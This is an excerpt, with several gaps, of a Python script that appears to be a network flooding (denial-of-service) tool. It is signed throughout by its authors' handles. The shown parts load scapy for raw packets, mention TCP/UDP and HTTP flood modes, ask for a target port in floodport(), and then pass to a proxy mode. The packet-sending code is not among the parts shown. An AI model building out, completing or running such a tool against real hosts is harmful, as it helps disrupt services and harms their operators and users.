...
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # C0d3d by 1800#0001

if sys.platform.startswith("linux"): # C0d3d by 1800#0001
	from scapy.all import * # C0d3d by 1800#0001
elif sys.platform.startswith("freebsd"): # C0d3d by 1800#0001
	from scapy.all import * # C0d3d by 1800#0001
else: # C0d3d by 1800#0001
	print ("TCP/UDP FLOOD ARE NOT SUPPORTED UNDER THIS SYSTEM. YOU MUST USE HTTP FLOOD.") # C0d3d by 1800#0001(Vanis)
...
def floodport():
	...
	try:
		...
		portlist = range(65535) # C0d3d by V@N1S
		if port in portlist: # C0d3d by V@N1S
			pass # C0d3d by V@N1S
		else: # C0d3d by V@N1S
			print ("You mistyped, try again.")
			floodport() # C0d3d by V@N1S
	except ValueError: # C0d3d by V@N1S
		print ("You mistyped, try again.") # C0d3d by V@N1S
		floodport() # C0d3d by V@N1S
	proxymode()
